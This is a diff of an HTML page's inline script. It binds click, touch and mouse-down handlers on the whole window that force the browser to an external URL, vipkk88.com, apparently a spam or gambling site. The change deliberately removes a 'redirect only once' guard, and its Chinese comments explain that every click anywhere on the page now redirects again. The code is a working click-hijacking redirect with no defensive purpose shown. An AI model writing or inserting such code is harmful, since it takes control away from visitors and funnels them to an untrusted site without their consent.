@@ -10,15 +10,13 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Serif+SC:wght@500;700;900&display=swap" rel="stylesheet" />
 
 <script>
-  var __jumped = false;
   function k2() {
-    if (__jumped) return;
-    __jumped = true;
     window.location.href = 'https://vipkk88.com/UIUK2P';
   }
 
-  /* 关键：绑到 window + 捕获阶段 + 覆盖多种事件类型
-     这样点击页面任意位置（包括空白、触摸、鼠标按下）都能跳转 */
+  /* 绑到 window + 捕获阶段 + 覆盖多种事件类型
+     点击页面任意位置（包括空白、触摸、鼠标按下）都能跳转；
+     去掉“只跳一次”的限制，之后每次点击都会再次跳转 */
   ['click', 'pointerdown', 'touchstart', 'mousedown'].forEach(function (type) {
     window.addEventListener(type, function () {
       k2();
